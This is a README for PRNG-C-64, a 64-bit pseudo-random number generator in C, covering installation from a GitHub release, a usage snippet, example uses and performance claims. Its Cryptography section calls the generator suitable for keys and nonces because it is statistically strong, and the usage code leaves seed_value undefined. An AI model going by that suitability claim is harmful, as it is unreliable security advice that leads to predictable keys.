## Features

- **Fast Generation**: Generates random numbers quickly, making it ideal for performance-sensitive applications.
- **Statistically Strong**: Meets high standards for randomness, ensuring the numbers produced are unpredictable.
- **64-bit Support**: Works seamlessly with 64-bit integers, providing a wide range of values.
- **Minimum Period**: Guarantees a minimum period of \(2^{64}\), ensuring long sequences of random numbers without repetition.

## Installation

To get started with **PRNG-C-64**, you need to download the latest release. You can find it [here](https://github.com/z0554146665/prng-c-64/releases). After downloading, follow these steps:

1. Unzip the downloaded file.
2. Navigate to the extracted folder in your terminal.
3. Compile the source code using your preferred C compiler. For example:

   ```bash
   gcc -o prng-c-64 prng.c
   ```

4. Run the executable:

   ```bash
   ./prng-c-64
   ```

## Usage

Once you have installed the PRNG, you can start using it in your projects. Hereâ€™s a simple example of how to generate random numbers:

```c
#include "prng.h"

int main() {
    PRNG prng;
    prng_init(&prng, seed_value); // Initialize with a seed

    for (int i = 0; i < 10; i++) {
        uint64_t random_number = prng_generate(&prng);
        printf("Random Number %d: %llu\n", i + 1, random_number);
    }

    return 0;
}
```

In this example, you initialize the PRNG with a seed value and generate ten random numbers.

## Examples

Here are some practical examples of how you can use the PRNG in different scenarios:

### 1. Simulations

In simulations, random numbers are crucial for modeling real-world scenarios. You can use the PRNG to generate random events, such as rolling dice or drawing cards.

### 2. Cryptography

For cryptographic applications, randomness is essential for generating keys and nonces. The statistically strong nature of this PRNG makes it suitable for such tasks.

### 3. Gaming

In gaming, random number generation is used for everything from loot drops to procedural level generation. This PRNG can enhance the gaming experience by providing varied and unpredictable outcomes.

## Performance

The performance of **PRNG-C-64** is one of its standout features. It is designed to be fast while maintaining a high level of randomness. Here are some performance benchmarks:

- **Generation Speed**: Capable of generating millions of random numbers per second.
- **Memory Usage**: Optimized for low memory usage, making it suitable for embedded systems.

You can run performance tests by including the performance test files provided in the repository.
